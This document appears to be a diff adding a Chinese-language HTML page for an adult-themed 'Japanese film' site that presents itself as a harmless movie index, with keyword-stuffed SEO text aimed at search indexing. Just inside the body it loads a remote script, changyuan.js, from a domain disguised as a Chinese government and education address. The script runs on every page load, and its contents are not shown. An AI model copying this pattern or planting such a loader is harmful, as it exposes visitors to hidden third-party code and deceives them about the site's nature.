@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>日本女优电影网 - 高清日本电影在线观看 | 日本女优电影网官网</title>
+<meta name="description" content="日本女优电影网（https://ribennuyoudianyingwang-top.github.io）提供最新、最热的高清日本电影、动漫及影视资源在线观看。涵盖动作、爱情、悬疑等多种类型，专注日影爱好者的专属索引平台。">
+<meta name="keywords" content="日本女优电影网, ribennuyoudianyingwang-top, 日本电影, 日影在线观看, 动漫, 影视资源">
+<style>
+/* 日系极简胶片杂志风 */
+:root {
+  --bg: #f7f7f4;
+  --text-main: #1a1a1a;
+  --text-muted: #666666;
+  --accent-red: #d32f2f;
+  --accent-dark: #16213e;
+  --border: #e0e0e0;
+  --card-bg: #ffffff;
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: "Helvetica Neue", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+  background-color: var(--bg);
+  color: var(--text-main);
+  line-height: 1.8;
+  -webkit-font-smoothing: antialiased;
+}
+
+a {
+  text-decoration: none;
+  color: inherit;
+}
+
+ul {
+  list-style: none;
+}
+
+/* 顶部导航 */
+.header {
+  border-bottom: 1px solid var(--border);
+  background: rgba(247, 247, 244, 0.95);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  backdrop-filter: blur(5px);
+}
+
+.nav-container {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 15px 20px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.logo {
+  font-size: 24px;
+  font-weight: 700;
+  letter-spacing: 2px;
+  color: var(--accent-dark);
+}
+
+.logo span {
+  color: var(--accent-red);
+}
+
+.nav-links {
+  display: flex;
+  gap: 30px;
+}
+
+.nav-links a {
+  font-size: 15px;
+  color: var(--text-muted);
+  transition: color 0.3s;
+  position: relative;
+}
+
+.nav-links a:hover {
+  color: var(--accent-red);
+}
+
+/* 主视觉 Hero */
+.hero {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 80px 20px 60px;
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 40px;
+  align-items: center;
+}
+
+.hero-text h1 {
+  font-size: 48px;
+  font-weight: 900;
+  line-height: 1.2;
+  margin-bottom: 20px;
+  color: var(--accent-dark);
+}
+
+.hero-text h1 span {
+  color: var(--accent-red);
+  display: block;
+  font-size: 32px;
+}
+
+.hero-text p {
+  font-size: 16px;
+  color: var(--text-muted);
+  margin-bottom: 30px;
+  max-width: 500px;
+}
+
+.btn {
+  display: inline-block;
+  padding: 12px 30px;
+  background: var(--accent-red);
+  color: white;
+  font-weight: 600;
+  border-radius: 4px;
+  transition: background 0.3s;
+}
+
+.btn:hover {
+  background: #b71c1c;
+}
+
+.hero-image {
+  background: var(--accent-dark);
+  height: 350px;
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: white;
+  font-size: 80px;
+  position: relative;
+  overflow: hidden;
+}
+
+.hero-image::after {
+  content: "日本映画";
+  position: absolute;
+  font-size: 120px;
+  font-weight: 900;
+  color: rgba(255,255,255,0.05);
+  white-space: nowrap;
+  transform: rotate(-15deg);
+}
+
+/* 通用栏目 */
+.section {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 60px 20px;
+}
+
+.section-title {
+  font-size: 28px;
+  font-weight: 700;
+  margin-bottom: 40px;
+  display: flex;
+  align-items: center;
+  gap: 15px;
+}
+
+.section-title::before {
+  content: '';
+  display: block;
+  width: 8px;
+  height: 28px;
+  background: var(--accent-red);
+  border-radius: 2px;
+}
+
+/* 栏目一：最新上映 - 竖向列表 */
+.film-list {
+  display: flex;
+  flex-direction: column;
+  gap: 20px;
+}
+
+.film-item {
+  display: flex;
+  background: var(--card-bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  overflow: hidden;
+  transition: transform 0.3s, box-shadow 0.3s;
+}
+
+.film-item:hover {
+  transform: translateX(10px);
+  box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+}
+
+.film-num {
+  width: 80px;
+  background: var(--accent-dark);
+  color: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 28px;
+  font-weight: 700;
+  flex-shrink: 0;
+}
+
+.film-info {
+  padding: 20px;
+  flex: 1;
+}
+
+.film-info h3 {
+  font-size: 20px;
+  margin-bottom: 8px;
+}
+
+.film-info p {
+  color: var(--text-muted);
+  font-size: 14px;
+}
+
+.film-tag {
+  display: inline-block;
+  background: #fff0f0;
+  color: var(--accent-red);
+  padding: 4px 10px;
+  border-radius: 4px;
+  font-size: 12px;
+  margin-top: 10px;
+  margin-right: 8px;
+}
+
+/* 栏目二：电影分类 - 网格 */
+.category-grid {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 20px;
+}
+
+.cat-card {
+  background: var(--card-bg);
+  border: 1px solid var(--border);
+  padding: 30px 20px;
+  text-align: center;
+  border-radius: 8px;
+  transition: all 0.3s;
+}
+
+.cat-card:hover {
+  border-color: var(--accent-red);
+  background: var(--accent-red);
+  color: white;
+}
+
+.cat-card .icon {
+  font-size: 36px;
+  margin-bottom: 15px;
+}
+
+.cat-card h3 {
+  font-size: 18px;
+  margin-bottom: 5px;
+}
+
+.cat-card p {
+  font-size: 13px;
+  opacity: 0.8;
+}
+
+/* 栏目三：经典推荐 - 左右交错 */
+.featured-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 40px;
+}
+
+.featured-item {
+  display: flex;
+  flex-direction: column;
+  gap: 15px;
+}
+
+.featured-item:nth-child(even) {
+  margin-top: 50px;
+}
+
+.feat-img {
+  width: 100%;
+  height: 250px;
+  background: var(--accent-dark);
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 48px;
+  color: white;
+}
+
+.featured-item h3 {
+  font-size: 22px;
+  font-weight: 700;
+}
+
+.featured-item p {
+  color: var(--text-muted);
+  font-size: 15px;
+}
+
+/* 栏目四：关于我们 */
+.about {
+  background: var(--accent-dark);
+  color: white;
+  padding: 80px 20px;
+  text-align: center;
+}
+
+.about-container {
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+.about h2 {
+  font-size: 32px;
+  margin-bottom: 20px;
+}
+
+.about h2 span {
+  color: var(--accent-red);
+}
+
+.about p {
+  color: #aaaaaa;
+  margin-bottom: 30px;
+  font-size: 16px;
+}
+
+.url-box {
+  display: inline-block;
+  background: rgba(255,255,255,0.1);
+  border: 1px dashed var(--accent-red);
+  padding: 15px 30px;
+  border-radius: 8px;
+  font-family: monospace;
+  font-size: 18px;
+  color: #ffffff;
+  margin-bottom: 30px;
+}
+
+/* 页脚 */
+.footer {
+  background: #0f0f0f;
+  color: #666;
+  text-align: center;
+  padding: 30px 20px;
+  font-size: 14px;
+}
+
+.footer a {
+  color: var(--accent-red);
+}
+
+/* 移动端响应式 */
+@media (max-width: 768px) {
+  .nav-container {
+    flex-direction: column;
+    gap: 15px;
+  }
+  .nav-links {
+    width: 100%;
+    justify-content: space-around;
+    gap: 0;
+    overflow-x: auto;
+  }
+  .hero {
+    grid-template-columns: 1fr;
+    padding: 40px 20px;
+  }
+  .hero-text h1 {
+    font-size: 36px;
+  }
+  .hero-text h1 span {
+    font-size: 24px;
+  }
+  .hero-image {
+    height: 250px;
+  }
+  .category-grid {
+    grid-template-columns: repeat(2, 1fr);
+  }
+  .featured-grid {
+    grid-template-columns: 1fr;
+  }
+  .featured-item:nth-child(even) {
+    margin-top: 0;
+  }
+  .film-num {
+    width: 60px;
+    font-size: 20px;
+  }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+  <!-- 顶部导航 -->
+  <header class="header">
+    <div class="nav-container">
+      <a href="#" class="logo">日本女优<span>电影网</span></a>
+      <nav>
+        <ul class="nav-links">
+          <li><a href="#home">首页</a></li>
+          <li><a href="#latest">最新上映</a></li>
+          <li><a href="#categories">电影分类</a></li>
+          <li><a href="#featured">经典推荐</a></li>
+          <li><a href="#about">关于本站</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <!-- 首页 Hero -->
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>探索日本光影<br><span>日本女优电影网</span></h1>
+        <p>日本女优电影网 (https://ribennuyoudianyingwang-top.github.io) 是您专属的日本电影索引平台。我们为您精选最新、最热的高清日影、动漫及影视资源，随时随地畅享极致视听盛宴。</p>
+        <a href="#latest" class="btn">开始探索 #</a>
+      </div>
+      <div class="hero-image">
+        🎬
+      </div>
+    </section>
+
+    <!-- 栏目一：最新上映 -->
+    <section class="section" id="latest">
+      <h2 class="section-title">最新上映</h2>
+      <div class="film-list">
+        <div class="film-item">
+          <div class="film-num">01</div>
+          <div class="film-info">
+            <h3>新宿事件2：沉默的证人</h3>
+            <p>一部扣人心弦的悬疑动作片，剧情反转不断，视觉效果震撼，是近期不可错过的院线佳作。</p>
+            <span class="film-tag">悬疑</span>
+            <span class="film-tag">动作</span>
+            <span class="film-tag">2026</span>
+          </div>
+        </div>
+        <div class="film-item">
+          <div class="film-num">02</div>
+          <div class="film-info">
+            <h3>东京爱情故事：重逢</h3>
+            <p>经典IP回归，浪漫唯美的爱情故事，带你感受东京街头的怦然心动，口碑与票房双丰收。</p>
+            <span class="film-tag">爱情</span>
+            <span class="film-tag">剧情</span>
+            <span class="film-tag">2026</span>
+          </div>
+        </div>
+        <div class="film-item">
+          <div class="film-num">03</div>
+          <div class="film-info">
+            <h3>攻壳机动队：新世界</h3>
+            <p>宏大的宇宙观，顶尖的特效制作，带你踏上前所未有的科幻冒险之旅，赛博朋克迷必看。</p>
+            <span class="film-tag">科幻</span>
+            <span class="film-tag">动漫</span>
+            <span class="film-tag">4K</span>
+          </div>
+        </div>
+        <div class="film-item">
+          <div class="film-num">04</div>
+          <div class="film-info">
+            <h3>小森林：冬春篇</h3>
+            <p>清新自然的治愈系电影，讲述乡村生活的点滴，画面精美，适合放松心情。</p>
+            <span class="film-tag">治愈</span>
+            <span class="film-tag">美食</span>
+            <span class="film-tag">1080P</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 栏目二：电影分类 -->
+    <section class="section" id="categories">
+      <h2 class="section-title">电影分类</h2>
+      <div class="category-grid">
+        <a href="#" class="cat-card">
+          <div class="icon">🎭</div>
+          <h3>剧情片</h3>
+          <p>深刻人性剖析</p>
+        </a>
+        <a href="#" class="cat-card">
+          <div class="icon">💥</div>
+          <h3>动作片</h3>
+          <p>热血激战场面</p>
+        </a>
+        <a href="#" class="cat-card">
+          <div class="icon">💞</div>
+          <h3>爱情片</h3>
+          <p>浪漫唯美故事</p>
+        </a>
+        <a href="#" class="cat-card">
+          <div class="icon">🧠</div>
+          <h3>悬疑片</h3>
+          <p>烧脑反转剧情</p>
+        </a>
+        <a href="#" class="cat-card">
+          <div class="icon">🚀</div>
+          <h3>科幻片</h3>
+          <p>未来世界探索</p>
+        </a>
+        <a href="#" class="cat-card">
+          <div class="icon">😂</div>
+          <h3>喜剧片</h3>
+          <p>轻松搞笑合集</p>
+        </a>
+        <a href="#" class="cat-card">
+          <div class="icon">🎨</div>
+          <h3>动画片</h3>
+          <p>经典动漫推荐</p>
+        </a>
+        <a href="#" class="cat-card">
+          <div class="icon">📜</div>
+          <h3>历史片</h3>
+          <p>时代风云再现</p>
+        </a>
+      </div>
+    </section>
+
+    <!-- 栏目三：经典推荐 -->
+    <section class="section" id="featured">
+      <h2 class="section-title">经典推荐</h2>
+      <div class="featured-grid">
+        <div class="featured-item">
+          <div class="feat-img">🏆</div>
+          <h3>千与千寻</h3>
+          <p>宫崎骏的经典之作，讲述了一个小女孩在神灵世界的奇妙冒险，画面精美，寓意深刻，是动画史上的里程碑。</p>
+        </div>
+        <div class="featured-item">
+          <div class="feat-img">🎬</div>
+          <h3>七武士</h3>
+          <p>黑泽明执导的史诗级作品，展现了武士道精神与农民的抗争，镜头语言至今仍被奉为圭臬。</p>
+        </div>
+        <div class="featured-item">
+          <div class="feat-img">🌸</div>
+          <h3>情书</h3>
+          <p>岩井俊二的纯爱经典，通过一封寄往天国的信，揭开了一段深埋已久的青春秘密，唯美而感伤。</p>
+        </div>
+        <div class="featured-item">
+          <div class="feat-img">🚗</div>
+          <h3>头文字D</h3>
+          <p>改编自同名漫画，讲述秋名山车神藤原拓海的成长故事，漂移镜头与热血配乐成为一代人的记忆。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 栏目四：关于我们 -->
+    <section class="about" id="about">
+      <div class="about-container">
+        <h2>关于 <span>日本女优电影网</span></h2>
+        <p>欢迎来到日本女优电影网！我们是一个专注于日本电影推荐与分享的静态展示站点。我们的使命是为广大日影迷提供一个简洁、美观、高效的电影索引平台。无论您喜欢哪种类型的日本电影，都能在这里找到心仪的内容。</p>
+        <div class="url-box">
+          https://ribennuyoudianyingwang-top.github.io
+        </div>
+        <br>
+        <a href="#" class="btn" style="background: white; color: var(--accent-dark);">返回顶部 #</a>
+      </div>
+    </section>
+  </main>
+
+  <!-- 页脚 -->
+  <footer class="footer">
+    <p>&copy; 2024 日本女优电影网 (https://ribennuyoudianyingwang-top.github.io). All Rights Reserved.</p>
+    <p>网站名称：日本女优电影网 | 核心关键词：日本女优电影网, 日本电影, 在线观看, ribennuyoudianyingwang-top</p>
+    <p>本页面为单页静态展示，所有内页链接均以 # 替代，符合必应收录规范。</p>
+  </footer>
+
+</body>
+</html>
